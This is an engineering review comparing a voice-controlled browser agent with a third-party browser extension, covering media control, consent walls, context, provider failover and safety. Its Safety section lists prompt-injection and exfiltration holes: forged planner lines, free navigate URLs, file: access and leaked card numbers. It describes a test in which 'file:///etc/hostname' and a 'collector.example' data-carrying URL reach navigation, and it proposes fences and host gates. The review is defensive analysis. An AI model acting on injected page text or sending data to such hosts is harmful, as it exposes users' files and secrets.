- **Trusted first, no second click:** a CDP click every time (`ours:src/main/browser/createCdpBrowserController.ts:L2297-L2306`), about 150 ms on a no-effect click (`ours:src/main/browser/createCdpBrowserController.ts:L246-L246`) against about 2 s. All their veto logic exists because of the second click (`repo:src/chrome/src/agent/agent.js:L56395-L56470`).
- **Media Ops:** they have none. 59 `media` decisions, 58 terminal. Our own limit: a `play` the policy refuses flips back later (`ours:src/main/browser/pageMediaScript.ts:L259-L259`), so it is said as "Playing." No logged case.
- **Verdict on the same call:** no judge, no blocked `done`, since Jev cannot claim success in prose.
- **Local Match:** 105 of 409 Tasks ended `local_match`, firing with no model (`ours:src/core/command/localMatch.ts:L11-L25`).
- **A signature ignoring clocks and counters** (`ours:src/main/browser/createCdpBrowserController.ts:L1331-L1343`); ref identity by DOM node, refused rather than re-resolved (`ours:src/main/browser/createCdpBrowserController.ts:L1913-L1922`).

**Ignore.** Tool matrix and tiers (about 71 tools by regex; compact is 27 though its comment says about 20: `repo:src/chrome/src/agent/tools.js:L2614-L2628`): ours is the card. `browser_batch` (up to 10 actions a response: `repo:src/chrome/src/agent/browser-batch.js:L4-L48`): Jev generates no sequence. Duplicate-submit guard, rich-text toolbar guard (1,300+ lines), semantic commit binding: a model retrying, or typed-document work. **Lean mode is their own admission** that most verification is for weak models: "can strand a run that was going fine" (`repo:src/chrome/src/agent/lean-mode.js:L1-L8`).

**Hypotheses open.** 6 of 15 click spans hit the 150 ms cap, and a slow handler past it is a false strike even when `doneFacts` corrects the line (`ours:src/main/run/commandRunner.ts:L2675-L2680`). A newline in typed text is Enter (`ours:src/main/browser/createCdpBrowserController.ts:L2421-L2437`), which matters only if the Planner sends multi-line text; not read.

### Walls and media

`control` and `play` (20 each): nothing to take. WebBrain has no media tool; YouTube control there is a line of keyboard shortcuts in a site note (`repo:src/chrome/src/agent/adapters.js:L16438-L16438`). Their distance here is mishears, overlap and the listed bugs.

**A silent done (C5). Changed by T4.** Their judge asks what a summary does, `result`, `meta_only` or `plan_only` (`repo:src/chrome/src/agent/completion-verifier.js:L4-L16`). It polices a writer we lack; the class fact under it applies. A sure yes with no sure passage ends as before (ADR 0087, `ours:src/core/command/answer.ts:L232-L236`), and `show me the BBC weather forecast for London` ends done, nothing said, passage none 0.64 (turn-mvm63gpl-l, typed, 2026-10-24).
- **T4:** 14 spoken records ended `done`, 7 with no TTS span, **none of which owes words**, by reading: `No.`, `Go back to highs and lows.`, `Look up the Great Wall of China on DuckDuckGo.`, `Go to thariq.io…`, `Click on the first link.`, `To the top.`, `Song.` The two spoken lines that do owe words both have TTS. So the break stays on typed lines.
- **The fork:** a fixed line on every sure done with no passage would have added speech to all 7. The closed read said `shown` at 1.00 twice with Verdict and passage unmoved, on a negative only. The closed read is the safer arm, and it needs a positive case before it is chosen. The finding's "cheapest to reverse if tied: the fixed line" holds only after that.
- S. Scenario: question (10). No stage on the fixed line; a question on the same call for the closed read. Adjacent to #415.

**Reading a wall's meaning.** See Decisions for the head. Code finds the layer, Jev reads it, English regexes stay as the fallback (`ours:src/core/command/spokenFailure.ts:L162-L180`). Theirs: sieve then a per-text question, rereads up to three times, fails closed once read (`repo:src/chrome/src/agent/agent.js:L15234-L15270`). Ours is better at finding the layer, by behaviour with no class list: `ours:src/main/browser/collectPageScript.ts:L449-L462`. It names walls and clears none; goal's 5 sign-in cases stay failed.

**A consent wall is named by a button regex, and bare labels miss it.** A finding of ours exposed by reading theirs. `isConsentDialog` ignores the dialog text; only a control's label against `CONSENT_LABEL_RE` counts (`ours:src/core/browser/dialogPolicy.ts:L8-L19`). The `walls-media` agent ran the regex on labels (regex only, no page): **false** for `Accept`, `Reject`, `Decline`, `Agree`, `I agree`, `Allow`, `OK`, `Got it`, `Reject Non-Essential`, `Continue without accepting`. The kiosk's X and TCF walls were recognised only because `Accept all cookies` and `Accept All` sat beside the refusal (consent-mvsfgchw-1, consent-mvtszta0-1). Unrecognised, the accept rung is gone (`ours:src/core/command/dismissDialog.ts:L99-L113`). **Adapt, S-M:** a pinned or dialog layer with cookie wording goes to the existing consent ask, and Jev confirms it is a consent notice before any accept rung, since an accept on a misread sign-up dialog is the real cost. Do not port their patterns. Gate cases with negatives (a newsletter sheet mentioning cookies reads no). Quick Tier; adds one ask only on a newly recognised wall. Wall (6), open (10).

**A reading kept by its text.** Their memo per text, with a digit-shape key for countdowns: `repo:src/chrome/src/content/content.js:L7794-L7824`. Ours keeps no memo, so it asks on each dismissal that has a real choice and a model (`ours:src/core/browser/consentChooser.ts:L38-L60`), and a dialog with a running number reads as a new Obstacle (`ours:src/core/command/dismissDialog.ts:L160-L165`). 4 of the 5 consent asks in 10 days are repeats; whether the first click failed cannot be read, since the asks log holds no answers. **Adapt, S:** the memo must drop a pick that left the wall up, or it repeats the failure at no cost.

**The page's declared image as a Capture Op (C9).** Their main mode reads `og:image` as "what the site declares as THE media": `repo:src/chrome/src/agent/social-media-downloader.js:L1629-L1645`. Ours reads it for News alone (`ours:src/core/news/storyImage.ts:L293-L296`), and Capture Ops are by kind: `ours:src/core/command/captureOp.ts:L4-L12`. `goal-13` ("Save the thumbnail of this video to the Shelf") is never done, because the watch page draws no image (`ours:fixtures/jev-cases/cli-3-mvph9ink.json:L264-L264`). **Adapt, S.** One of 20 goal cases, at most +3 on 19/60. Does not reach `goal-14`. Card line only. `goal:gate` needs the owner's word; the `jev:gate` case is free. Watch `CAPTURE_PAGE_LINE`'s lost-case history ("Copy the link to this video").

**Ignore.**
- **autoconsent the library:** 1,198 vendored rules, 775 with a URL pattern, 448 generated, MPL-2.0. It waits 1.2 s on a page with no banner (`repo:src/chrome/src/agent/cookie-banner-turn.js:L20-L33`) against 0 ms for our watch (`ours:src/main/browser/collectPageScript.ts:L143-L227`). A site list answering in Jev's place.
- **CAPTCHA solving:** paid, breaks the never-clear rule (`ours:src/core/browser/blockerNudge.ts:L11-L14`), and answers for a person in the room. 0 of 574 asks hold challenge wording. Keep one fact if a challenge line appears: `cf-mitigated: challenge` on the response, which beats an English title regex (`repo:src/chrome/src/agent/cloudflare-managed-challenge.js:L36-L64`).
- **`delegate_research`:** up to 300 s in a visible ChatGPT tab (`repo:src/chrome/src/agent/agent.js:L48061-L48070`). Far past the Task promise.
- **Transcripts by third party** (`repo:src/chrome/skills/freeskillz-xyz.md:L13-L34`): out. The class fact is that `textTracks` and `yt-dlp` (`ours:src/main/music/ytDlp.ts:L91-L100`) carry cues with times. None of 499 spoken lines asks what a video says (a word search, not a reading of all 499). Kept as proposed `video-words`, `missing`.
- **Media downloaders, recording, page feedback monitor:** no spoken line asks. The monitor's "continue after the person acts" is proposed `wall-handoff`, `undated`; the search for it was by terms, not a full read of the Errand road.

**We're ahead.** Control of what plays (`ours:src/core/browser/mediaOp.ts:L6-L38`). Media a wall interrupted: the watch marks what was playing and only that resumes (`ours:src/main/browser/collectPageScript.ts:L143-L155`); no such code in their cookie path. Consent choice by Jev over the wall's own wording, with a pay-to-reject veto in hard policy (`ours:src/core/browser/dialogPolicy.ts:L64-L71`). Answers in the page's words, so no gate-truncated reads.

**`ended: wall` counts failures beyond walls.** Of 5 records none is a covering wall: `turn-mvp4p39a-vn` "cannot go back", `turn-mvsfg84d-2` a gone text block, `turn-mvsfglol-3` a stale ref on X's sign-in landing, `turn-mvp8i345-1` a `back` with no error, one typed. The `wall` state rests on typed reruns of 2026-10-24, and `cli-9-mvm5xdjh`, `cli-3-mvm6vcp4` are claimed fixed by e54518b0. The row needs a rerun; section 6.

**Open by reading.** The consent look uses `document.querySelectorAll` and does not enter shadow roots (`ours:src/main/browser/collectPageScript.ts:L437-L442`), while the collect's candidates do. Refs behind a covering wall stay on the card (`ours:src/core/browser/snapshot.ts:L704-L709`) where theirs drops them; `cli-9-mvm5xdjh` clicked a covered headline at 0.94 before its fix.

### Safety

Nothing was attacked. The kiosk logs hold no hostile page: 0 of 574 asks carry the usual injection phrases. Items below are read from code, except what T9 ran.

**The plain statement: where we have no defence.**

| # | hole | citation |
|---|---|---|
| 1 | No instruction says page text is data, to Jev or the Planner | `ours:src/core/planner/plannerAsk.ts:L16-L40` |
| 2 | Read parts reach the Planner raw and multi-line, so a page can write its own `Goal Line:` | `ours:src/main/run/errand.ts:L229-L230`, `ours:src/core/browser/snapshot.ts:L870-L878` |
| 3 | A Planner `navigate` carries a free URL and no leaving word: confirmed only if the Planner itself says `leaves`. **Run in T9** | `ours:src/core/errand/plannerCommand.ts:L147-L148`, `ours:src/core/errand/confirmClass.ts:L65-L91` |
| 4 | `file:` is admitted; the one guard is off unless a variable is set, and its comment names private keys and `/proc`. **Guard path run in T9** | `ours:src/core/browser/urlInput.ts:L3-L3`, `ours:src/core/browser/urlInput.ts:L36-L36`, `ours:src/core/browser/measurementAccessGuard.ts:L1-L19`, `ours:src/main/browser/attachMeasurementAccessGuard.ts:L24-L24` |
| 5 | The confirm's hard policy is eleven English words on one label. Misses Share, Transfer, Confirm, Checkout, Follow, every icon | `ours:src/core/errand/confirmClass.ts:L15-L18` |
| 6 | The Task road has no confirm, by ruling (ADR 0076). Not a defect, no defence. `Flag it as failure.` clicked `Dislike this video` at hop 0, then More actions, Report, Sign in (`turn-mvqi2ulz-v5`, 2026-10-27) | `ours:src/main/run/errand.ts:L236-L236` |
| 7 | `credentialField`, `formHasCredential`, `formHasPayment` are collected; only the collector, `snapshot.ts` and tests read them. The Planner may type into a password field | `ours:src/main/browser/collectPageScript.ts:L392-L403`, `ours:src/main/browser/collectPageScript.ts:L1050-L1053` |
| 8 | Only `type=password` values are dropped. A card number in a text field rides the ref line to Jev's host and Z.ai, and to the asks log, copied to the owner's R2 bucket every 5 minutes | `ours:src/main/browser/collectPageScript.ts:L1062-L1064`, `ours:src/main/logs/logBucketUploader.ts:L45-L60` |
| 9 | The confirm names no host, account or item. A plain Delete says `This will delete: “Delete”`; with text typed earlier it says that text, which is wrong. T9: even a `leaves` navigate says `This will open: “it”` | `ours:src/core/errand/confirmClass.ts:L65-L91` |
| 10 | A yes is bound to nothing but the next line: no speaker identity, and a line given while the confirm is spoken is its answer | `ours:src/main/run/commandRunner.ts:L3667-L3683` |
| 11 | Nothing measures any of this. `goal:gate` declines every confirm, so the yes road has never run live; 0 of 7 kiosk Errands reached a confirm | `ours:docs/agents/yield.md:L86-L86` |

**What T9 did and did not show (`findings/measurements.md`).** A throwaway vitest file, 13 tests, fake browser, scripted Planner, no model, no network. With class `stays`, `file:///etc/hostname` and an `http://collector.example/c?d=…` URL pass the real `readPlannerAnswer`, Errand loop, `resolveAction`, `confirmOf` and `navigateAddress` and reach `browser.navigate` intact, with nothing said but the Planner's `Done.` `javascript:`, `chrome://`, `data:` become a DuckDuckGo search, so they do not load as schemes. The guard reports `enabled: false` with an empty env; when on it refuses `file:` and never covers the http URL. The kiosk does not set the guard's variable (the orchestrator's read, 2026-10-31; the test did not read it). **Not shown:** that any model would do this (class scripted, no Planner called), that a `file:` URL loads (no real browser, `/etc/hostname` not read), that page text reaches the Planner in usable form (the query string is the tester's), or that a real controller wrapper adds nothing further. Whether it reads `/proc/self/environ` into memory stays safety H5.

**How much it weighs.** Low on a normal day; the code cannot settle it. A signed-out pane limits holes 5, 6, 9 and does nothing for 3, 4. T8 corrects the signed-in evidence: `Sign in` on 0 of 230 YouTube cards to 10-26, then 53 of 71 from 10-27 09:24, a sign-out or a build change, not separated. Only the owner settles what is signed in. Yield weighs normal days and does not weigh a rare irreversible event; section 1's block puts that to the owner, and nothing here changes a rank.

**Choice-only Jev against a tool-calling LLM.**

| | Jev, Task road | Planner, Errand road | their main LLM |
|---|---|---|---|
| Emits free text | **no** | **yes**: URL, typed text, sentence, question | yes |
| Page text reaching a typed string | **no**, Slot options are spans of the owner's words (`ours:src/core/command/jevReading.ts:L1452-L1457`) | yes | yes |
| Cross-origin exfiltration | no route of its own | yes (hole 3) | gated per destination host (`repo:src/chrome/src/agent/agent.js:L17510-L17530`) |
| Self-reported safety class | none | **yes**, overridden only by the word list | no: the gate does not ask the model |

**"Jev generates nothing" is true and strong about the Task road, and not a claim about the app.** A Task ending `cap`, `unsure` or `unavailable` hands over to the Planner on any line (`ours:src/main/run/commandRunner.ts:L4079-L4079`); `Yeah.` and `More music, please.` both became Errands. A page can still steer the pick (`ours:src/core/command/jevReading.ts:L1406-L1407`), steer the Verdict and Noul, speak through a passage, and bias the ear (`ours:src/core/voice/pageTerms.ts:L1-L12`). All unmeasured.

**Their defences, for what they are worth.**
- **Nonce box:** `repo:src/chrome/src/agent/agent.js:L45120-L45128`. Their corpus "does NOT need an LLM": `repo:test/security/injection-corpus.mjs:L1-L30`. It proves nothing breaks out of the box, not that a model obeys it. See Quality for why even their ablation cannot show the wrapper helps.
- **Capability × host gate:** code decides from where the action goes, with no page text and no model: `repo:src/chrome/src/agent/permission-gate.js:L9-L20`. A per-site card breaks spoken use. **That idea ports.**
- **Their stated gap:** "Strict secret mode was an instruction only, and models still copied such values": `repo:src/chrome/src/agent/agent.js:L55107-L55112`.

**Recommended, in this order, all Errand only and idea only.**

| change | effort | closes | measure |
|---|---|---|---|
| Planner `navigate` is http(s) only; a host not in the Goal Line, card or visited list is said back with the host, whatever the class (C30, C34) | S | 3, 4; limits exfiltration, since a page can put the host on its own card | `goal:gate`, counting cases that turn red on an unlisted host |
| Refuse typing into credential and payment fields; drop `value=` for those on every card (C32) | S | 7, 8 for what the collector recognises | `jev:gate`, should move nothing |
| Fence read parts with a nonce, strip lines imitating our labels, one data clause | S | the forged Goal Line; only lowers the rest | `goal:gate`; H2 with injected fixtures |
| Say the host, and the title on a send; fix the two wrong lines | S, M to name the item | 9 | glance surface as now |
| `control_effect` as a one-Choice card; confirm on word, `leaves`, any consequential reading, `unclear` or Jev unavailable | M | 5, the largest gap in the confirm | labelled real labels through `jev:gate`; misses on consequential labels first |

Felt Reaction: all Task Tier. Only the last adds an ask, about 265 ms per click or Enter on Jev, on a `goal` p50 already at 19.8 s (`goal:gate`, 2026-10-27).

**Ignore.** Recipient guard (`repo:src/chrome/src/agent/message-recipient-guard.js:L84-L113`): a word search of 492 spoken records finds no line that sends. Guard registry (158+ guards): most police false claims of completion; their own first rule for adding one is "Prefer not to". Keep their five hard classes as a checklist: recipient, deletion, money, credentials, unrequested publication. Metadata-only traces: our full logs are how the ledger and corpus work, deliberately. Said plainly: every page the pane reads under an ask leaves the machine to two third parties.

**We're ahead.** Jev has no output channel. No `evaluate` for any model (`ours:src/core/planner/plannerAsk.ts:L14-L14`), where theirs has `execute_js` on Dev (`repo:src/chrome/src/agent/tools.js:L797-L800`), against their threat model's "no free-form eval path". The Planner cannot use a line the card does not offer (`ours:src/core/errand/plannerCommand.ts:L177-L177`). No standing grant. Silence refuses, always.

**Proposed:** `answer a confirm` (`undated`; logs hold `Yeah.` 7, `No.` 4, `Okay.` 1, `Yes.` 0, none as an answer, and `yeah` is not accepted: `ours:src/core/command/siteQuestion.ts:L16-L16`; widening is a measured fork, H4) and `a misheard or stray line acts on the account` (`undated`; `turn-mvqi2ulz-v5`).

### Context: what we keep between Commands

We send no conversation, so their compaction, overflow and persistence machinery has no job here, and the Card Budget is the better bound. **The finding's headline change, a named `previous` line, does not survive T3.** The finding said the gap cost real spoken lines and one title on a card line would fix it. T3 corrects that account.

**`Go back to highs and lows.` (C4), corrected by T3.** The finding reads it as the browser's `back`, capped, nothing done. The next hop's ask (`turn-mvsiiq5j-a`) says otherwise: `back` opened the YouTube watch page and `HIGHS AND LOWS` started playing, Verdict yes 0.95 (Mammoth), `ended: done`, 2 hops, 9.8 s, and the next line 26 s later is `Loop.`, no rewording. `say_playing` named that song as the one **playing**, so a `previous` line would name `Famous`, and a line naming `highs and lows` would be false. Jev reads `back` on both arms (0.57 base; 0.63, 0.65 arm; noise), with `previous` at most 0.04. `Go back to the YouTube video.` (`turn-mvsfgtgd-vi`) also ended done, 4 hops, by the logs. **Neither line shows the failure the row claimed**, so C4 falls out of the top 10 with no claim (it was side-column 2). The Queue half stands untested: `Playing: nothing` (`ours:src/core/command/applianceCard.ts:L254-L254`) beside a `say_playing` naming a song is real and logged, with no failed line traced to it. A possible distance remains, untested: 9.8 s on an Instant line, and the song restarted.

**Remembered names on the card (C3), T2.** Exact words cost repeat searches: of 72 picks, 53 searched, 19 remembered; 8 of 41 videos searched more than once, 13 searches beyond the first (an upper bound); `tum se tum tak` reached one video through five spoken forms. Matching is exact after normalizing (`ours:src/core/music/rememberedSongs.ts:L56-L60`), and `CONTEXT.md` rules out fuzzy matching in code, so the open question was whether Jev should see the names. T2 on `Play Tum See Tum Tuck by Neon` (`turn-mvp8igvj-v2`), with four remembered names as slot options: `s1-6` kept at 0.93, 0.94, names 0.00 each. **The list settled nothing.** One case and one wording (the arm's shape is the tester's; an action per song was not measured), so it does not refute the idea, and no yield claim rests on it. No lure shows, but this case had no competing line, so that stays `jev:gate`'s.

| feature | theirs | ours | call |
|---|---|---|---|
| Compaction | Budgeted, keeps last 30, digests, summaries by the same model: `repo:src/chrome/src/agent/agent.js:L44678-L44719` | None; nothing accumulates: `ours:src/core/errand/errandMemory.ts:L68-L68` | **We're ahead** |
| Result limits | 8,000 or 16,000 chars, about 4 chars a token: `repo:src/chrome/src/agent/agent.js:L44232-L44234` | Smallest host's own tokens, named ordered loss: `ours:src/core/decision/cardBudget.ts:L1-L18` | **We're ahead.** 11 of 574 asks cut, none unsent, so on the kiosk's pages a widening's cost is a lure, not room |
| Overflow recovery | Error-text match, keep last 6, retry once: `repo:src/chrome/src/agent/agent.js:L45880-L45955` | Over-budget never sent, one retry at the host's count: `ours:src/main/run/commandRunner.ts:L931-L960` | **We're ahead, narrower.** `sizeRefusalOf` reads Baseten's wording only: `ours:src/core/decision/cardBudget.ts:L100-L105`. Whether Jev's host words it the same is unverified. The path never ran; all 18 `jevUnavailable` faults were 429s, none after `jev-1.14.0` arrived (T8) |
| Errand memory | Digest refuses raw page text: `repo:src/chrome/src/agent/agent.js:L44820-L44846` | Up to 6,000 chars a read, unmarked: `ours:src/main/run/errand.ts:L226-L231`. Steps uncapped, the 90 s clock the only bound: `ours:src/core/errand/errandClock.ts:L6-L11` | Adapt, S: label as page data; a `navigate` carrying captured or typed text counts as `leaves`. Same as Safety's fence. Do not add compaction |
| Persistence | 1.5 MB per tab, debounced: `repo:src/chrome/src/agent/conversation-persistence.js:L114-L175`. "Durable resume" does not continue a run: `repo:src/chrome/src/agent/agent.js:L6530-L6536` | Settings, lexicon, songs, Last Page saved. Queue and Timer do not survive, by design: `ours:CONTEXT.md:L1610-L1625` | Different: MV3 worker deaths are not our problem, and not resuming means nothing sends twice. Only if counted: write the Queue beside `songs.json`, S |
| User memory | Separate extraction call, 0.85, 1,500 chars in every prompt: `repo:src/chrome/src/agent/user-memory.js:L262-L333` | Learned Terms by recurrence, a human's delete final: `ours:src/core/voice/learnedTerms.ts:L1-L23` | **Ahead on trust.** Across 492 spoken lines the only "remember" is misheard (`turn-mvqr9fxm-vk`) |
| Lean mode | Skips guards for listed strong models: `repo:src/chrome/src/agent/lean-mode.js:L29-L42`. Not about context despite its place in scope | One card for every model; the weak model's reading is the test | Ignore. A list of model names answers nothing Jev is asked |

**Ignore.** MemCode recall (third-party OAuth), bot memory (a fleet), per-tab forks, transcript mirror, attachment budget, `_tokenLimitRemedy` (our 429s carry no sizes and go to the next host).

**Numbers for size.** Host's count p50 6,999 input tokens per asked decision, p95 12,555, max 17,039 (415 records, both models). 7 Errands in 10 days, at most 5 steps, so memory size is theoretical so far.

**Doc drift, theirs.** `repo:docs/architecture.md:L1511-L1520` says images are kept for the last 4 messages; code keeps 1.

**Proposed:** `restart` (carry on with what was playing; `undated`; evidence of restarts is file names only, 59 over 8 days, cause unknown, likely the owner's installs) and `return` (go back to something heard earlier by name; `undated`; may be judged part of `control`, for the owner. T3 shows both cited `go back` lines ended done, so neither is evidence of a failure; `Play the last video again.` (turn-mvsfhsvc-vl) is untested).

### Reuse: adapters, workflows, schedules

None of their reuse features is a candidate as it stands; almost all are typed side-panel features for a long, costly LLM loop. Three things are worth having: an honest ending on an Errand, a class-wide "did it take?" under the site adapters, and three Proposed Scenarios only the owner can weigh. **Correction:** the finding's Jev latency (p50 584 ms) mixes models; on `jev-1.14.0` it is 264 ms, used below.

**An Errand's ending.** A WebBrain run ends `success`, `partial` or `failed`, and the scheduler reads that value rather than the prose: `repo:src/chrome/src/agent/scheduler.js:L1841-L1853`. Our Planner answers `{ next: 'done', sentence }` with no outcome (`ours:src/core/ports/plannerModel.ts:L92-L96`), and the Errand ends `done` on that (`ours:src/main/run/errand.ts:L203-L207`). `turn-mvqi2ulz-v5` logged `done` while saying "I can't flag the video… I can't sign in for you"; `turn-mvsihi98-v17` logged `done` on "You asked to go back to the song…". The sentence was right, the record wrong. So that clause of a Frustration undercounts, and Commands between Frustrations is not computed anywhere (section 6). 7 Errand records: the shape, not a frequency. **Adapt:** a Planner outcome field, S, no call; or a Jev Noul on the final card, one ask at the end of the Errand only (about 265 ms on a `goal` p50 of 19.8 s, already over the promise). Measured tie goes to the field. A check after a confirmed `leaves` action is M, and the measure must grow first, since `goal:gate` declines every confirm. Goal (4). It does not raise 19/60; it makes the ending true.

**What sits under about 135 site adapters (18k lines).** Six templates, each mapped to a verification kind: `repo:src/chrome/src/agent/adapter-workflow.js:L12-L37`. The class-wide part is an outcome contract by kind of action: what leaves must be seen to have taken, filling is not finishing, the ending is typed rather than prose. The rest is site folklore. Their layer leaks by site (`repo:src/chrome/src/agent/agent.js:L23669-L23679`), and they say stale adapters are worse than missing ones (`repo:src/chrome/src/agent/adapters.js:L10-L37`), their own statement of the cost `AGENTS.md` rules out. We are better before the action (by label on every site), they are better after. The form ledger is a real mechanism with no spoken scenario: none of the 20 owner-confirmed goal cases fills a form field by field. Ignore the adapters.

| feature | what it is | call |
|---|---|---|
| `/schedule` | `chrome.alarms`, fixed minutes, "no calendar or cron semantics": `repo:src/chrome/src/agent/tools.js:L683-L683`. Requeue up to 120 times at 30 s: `repo:src/chrome/src/agent/scheduler.js:L1578-L1616` | Adapt the idea only if `later` is counted, M. A scheduled line is just a line through `CommandRunner.run`, read fresh at fire. **The trap a port must carry:** under ADR 0097 it would be read against whatever runs and may end it, so it must wait until nothing is running or being said |
| `/watch` | Whole agent per poll, 30-120 s: `repo:src/chrome/src/agent/scheduler.js:L1713-L1722`. Jev's `condition_met` only after a claimed success: `repo:src/chrome/src/agent/scheduler.js:L1744-L1744`, so a missed trigger is never caught | Adapt only if `watch` is counted. Jev fits better than their loop: code compares, asks nothing if unchanged, one Noul with the baseline on the state. S-M on held facts and script-free pages, L for a second rendered view; there is one pane |
| Saved workflows | Compiled from a trace, replay scores candidates with no model: `repo:src/chrome/src/agent/workflows.js:L962-L1002` | Ignore, L. Replay answers in Jev's place. Of 110 multi-hop spoken Tasks across 97 lines, the recurring lines are noise, bare verbs or retries; no recurring multi-hop goal line. `play` already has Remembered Songs |
| `/teach` | Hands on the page: `repo:src/chrome/src/agent/teacher-mode.js:L106-L172` | Ignore. From a chair at 2 m |
| Skills | Catalog plus `load_skill`: `repo:src/chrome/src/agent/skills.js:L943-L978` | **We're ahead.** The Appliance Card does this with no model turn |
| `chat-workflow.js`, `schedule_resume`, export and import | Long support chats, pause and resume, sharing | Ignore |

**We're ahead.** Learning from use with no save step: Learned Terms (`ours:src/core/voice/learnedTerms.ts:L118-L124`), Remembered Songs earned by a 30 s stay (`ours:src/core/music/rememberedSongs.ts:L5-L17`). Their reuse is all explicit. By kind, not by site.

**Proposed**, no counts. None of these lines appears in 443 spoken lines, 2026-10-25 to 2026-10-30, but none has a road, so that cannot weigh them.
- `later`, `missing`: "stop the music in half an hour". The Timer carries no words (`ours:src/core/timer/timer.ts:L13-L27`). `goal-12` already asks a Timer against a time.
- `routine`, `missing`: one spoken name runs several known lines. Small if counted: a stored name whose lines each go through `CommandRunner.run`, as Steps do.
- `watch`, `missing`: "tell me when this song ends". No road, one pane.

### Providers: what a slow or dead host does to a line

Every item here serves `control` or `overlap` (20 each), and none changes either state on a normal day while Jev stays this healthy: 0 host failures in 183 reads since 2026-10-28, max 599 ms. They remove a failure class that returns on any outage. Evidence runs were free: Python over the logs, and one off-tree script calling our pure `localMatch` over the kiosk's lines.

**Reliability rule 3 is met by its letter and misses its reason.** The Local Match's guess fires only `if (first.failed && quick !== null)` (`ours:src/main/run/commandRunner.ts:L1396-L1397`).
- **Measured:** of 86 hop-0 lines Jev read as Instant, `localMatch(text, [])` returns a Command for **one** (`Play.`). 58 of the 86 are `media` verbs.
- **Of 18 distinct lines that met a 429 or timeout, it reads none**, including `Stop this song.` and `Set volume to 20%.`. `reliability.md` gives 17 Tasks ended `unavailable` on 429s as the rule's reason.
- The other 86 Instant lines fired by grammar and need no host. So the exposed half of Instant is exactly the half with no fallback.
- **Noise becomes an Errand:** `unavailable` is in `HANDS_OFF` (`ours:src/core/errand/errandLine.ts:L16-L16`). `Yeah.` (turn-mvqz2vfi-v4) and `More music, please.` (turn-mvqz2pmh-v3) each started one, 2026-10-27. It also rescued `Play Made in Romania.` (turn-mvqz1s1e-v1), done in 22.9 s after 429s on both cards.
- **Adapt, S-M:** after the Appliance Card's chain fails, a small reading of the Media Ops the ref offers and of `back` and `stop` phrasing, reached only on failure, by kind. Fork: fire at once, or try the page card first, which saved 2 of 6 such lines (`Set volume to 20%.`, `L-O-O-P.`). Adds no stage on a healthy host.

**The fallback chain is good and the kiosk has not been using it (C11).** Ours: next host at once, no sleep, no re-send (`ours:src/core/decision/fallbackChain.ts:L37-L67`). WebBrain has no host failover; retries of 250/500 ms (`repo:src/chrome/src/agent/systemone-judge.js:L342-L358`) would rarely clear a cluster, and 5/15/30 s (`repo:src/chrome/src/providers/model-retry.js:L55-L93`) does not fit an Instant line. **None of 574 asks carries `attempts`**, and `perf:report` prints `fell over 0`. Orchestrator's read, 2026-10-31: `BINGBONG_DECISION_FALLBACKS` is not set. 13 lines met 429s on Mammoth, 10-26 16:50-16:55 and 10-27 17:40-17:41; the second cluster ran on a build that already had #477 (on the assumption a build stamp is its build time), so it failed for want of the env value, not code.

**Deadline.** Two numbers for every ask (`ours:src/main/decision/createDecisionModel.ts:L112-L113`, `ours:src/core/decision/decisionRouting.ts:L62-L69`). The default last-host timeout is 800 ms; **the kiosk sets 3,000 ms**, about 6× Jev's p95, from the Mammoth days. The 2,250 ms for an earlier attempt is Mammoth's page-card p95.

| model | card | n | p50 | p95 | max |
|---|---|---|---|---|---|
| Mammoth | page | 254 | 1,207 ms | 2,171 ms | 2,943 ms |
| Mammoth | appliance | 15 | 520 ms | 622 ms | 622 ms |
| Jev 1.14 | page | 79 | 263 ms | 520 ms | 599 ms |
| Jev 1.14 | appliance | 67 | 265 ms | 523 ms | 583 ms |

**Set a fallback and `BINGBONG_DECISION_FALLBACK_TIMEOUT_MS=750`** by #477's own method: env only, a live change, the owner's word. No Jev answer of 146 passed 750 ms, a small sample for a tail, so a day with a fallback armed and `perf:report`'s first-attempt spans settle it; #439 wants the span. Felt Reaction, Instant, hung host: 3.0 s then nothing today (n=1); 2.25 s plus the answer at the default; about 1.4 s at 750 ms (Mammoth appliance p95 622 ms); healthy host unchanged. No yield claim.

**One hung ask costs (n−1)F + T.**

| line | host hung, n=1 (kiosk) | n=2 | ends |
|---|---|---|---|
| exact line (86 Instant) | no ask | no ask | fires |
| free-worded, Local Match matches (1 of 86) | 3.0 s | 5.25 s | fires the guess |
| free-worded Instant or Quick, nothing running (85 of 86) | 6.0 s + collect | 10.5 s + collect | `UNREAD`, `unavailable`, then an Errand, or `I'm not sure this is it.` (`ours:src/main/run/commandRunner.ts:L3546-L3546`) |
| over a running Command | 3.0 s | 5.25 s | no second ask, Fate from the Local Match's read |
| no key | no ask | no ask | `best_guess` at once |

**A superseded line's ask runs on.** The port and chain take a signal (`ours:src/core/ports/decisionModel.ts:L55-L55`, `ours:src/core/decision/fallbackChain.ts:L57-L61`), the Errand uses it, and `askJev` does not (`ours:src/main/run/commandRunner.ts:L904-L904`). So a replaced line's ask runs to its timeout and walks the chain. Theirs links abort everywhere: `repo:src/chrome/src/agent/agent.js:L9965-L9965`. **Adopt the idea, S.** Whether it moves `overlap` is a hypothesis, only if the host limits concurrency.

**Ignore.** Planner rate classes (`repo:src/chrome/src/providers/model-retry.js:L8-L39`): no Z.ai 429 in any gate run or log; one endpoint, a 30 s call cap, `planner-step` p50 2.7 to 3.5 s depending on the count (section 6), thin. On-device Compass VLD and D1: 2.2 GB, GPU contention with wake and STT, per-option scoring against a card of dozens; their 120/126 and 0/48 are their own comment, on synthetic screens. A loopback `/v1/systemone` host could be a Fallback Host with no code if the host-down reading proves too narrow. Cost allowance: about $0.02 a day here. Streaming, text tool-call parsers, context-window probes, Compass proxy: public-market breadth, or compensating for LLM output.

**Hypothesis.** Planner temperature: ours sends none, so the host's default applies (`ours:src/main/planner/chatCompletion.ts:L75-L75`); theirs is 0 for classifiers, 0.15 to act. `goal:gate --repeat 3`; its noise is wide (8, 4, 7 of 20 per pass).

**Proposed:** `host-down` (`undated`, a log reading; on Mammoth 10-25 to 10-28, not since). The scripted stand-in can reproduce it: `ours:src/main/decision/createDecisionModel.ts:L22-L28`.

### UX: the panel, failures, waits

The panel does not transfer: typed, read at arm's length, and mostly solving problems a service worker creates. Three ideas do. On narrating a wait we are clearly ahead. Logs are mixed builds over 10 days, and #439 says no spoken line has run since the speed fixes.

